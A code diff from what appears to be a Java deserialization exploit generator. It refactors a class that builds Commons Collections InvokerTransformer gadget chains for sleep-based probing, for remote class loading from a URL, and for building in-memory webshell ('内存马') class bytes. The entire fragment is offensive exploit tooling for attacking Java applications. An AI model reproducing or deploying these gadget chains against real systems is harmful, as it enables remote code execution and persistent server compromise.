@@ -1,7 +1,8 @@
 package com.ppp.sinks;
 
-import com.ppp.MemShellHelper;
-import com.ppp.MemShellScheduler;
+import com.ppp.JavaClassHelper;
+import com.ppp.JavaClassScheduler;
+import com.ppp.scheduler.MemShellScheduler;
 import com.ppp.Printer;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
@@ -115,7 +116,16 @@ public class InvokerTransformer3 {
         Long sleepTime = sinksHelper.getSleepTime();
 
         Transformer[] transformers = null;
-        if (sleep == null) {
+        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
+            transformers = new Transformer[]{
+                    new ConstantTransformer(TimeUnit.class),
+                    new InvokerTransformer("getDeclaredField", new Class[]{
+                            String.class}, new Object[]{
+                            "SECONDS"}),
+                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
+                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
+                    new ConstantTransformer(1)};
+        } else {
             sleepTime = sleepTime * 1000L;
             transformers = new Transformer[]{
                     new ConstantTransformer(Thread.class),
@@ -125,15 +135,6 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("invoke", new Class[]{
                             Object.class, Object[].class}, new Object[]{
                             null, null}),
-                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
-                    new ConstantTransformer(1)};
-        } else if (sleep.equalsIgnoreCase("timeunit")) {
-            transformers = new Transformer[]{
-                    new ConstantTransformer(TimeUnit.class),
-                    new InvokerTransformer("getDeclaredField", new Class[]{
-                            String.class}, new Object[]{
-                            "SECONDS"}),
-                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
                     new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
                     new ConstantTransformer(1)};
         }
@@ -211,7 +212,7 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.RemoteLoad})
     public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
         String url = sinksHelper.getUrl();
-        String className = sinksHelper.getClassName();
+        String className = sinksHelper.getRemoteClassName();
         Object constructor = sinksHelper.getConstructor();
 
         Transformer[] transformers;
@@ -269,10 +270,11 @@ public class InvokerTransformer3 {
         byte[] classBytes = null;
         String javaClassName = null;
         // 内存马
-        MemShellHelper memShellHelper = sinksHelper.getMemShellHelper();
-        if (memShellHelper != null) {
-            classBytes = MemShellScheduler.build(memShellHelper);
-            javaClassName = memShellHelper.getJavaClassName();
+        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
+
+        if (javaClassHelper != null) {
+            classBytes = JavaClassScheduler.build(javaClassHelper);
+            javaClassName = javaClassHelper.getJavaClassName();
         }
 
 
